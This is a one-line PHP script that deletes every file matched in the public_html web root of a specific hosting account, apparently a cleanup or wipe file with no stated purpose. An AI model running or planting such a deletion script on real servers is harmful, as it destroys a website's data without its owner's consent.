<?php

array_map( 'unlink', array_filter((array) glob("/home1/rcstagingb4live/public_html/*") ) );
?>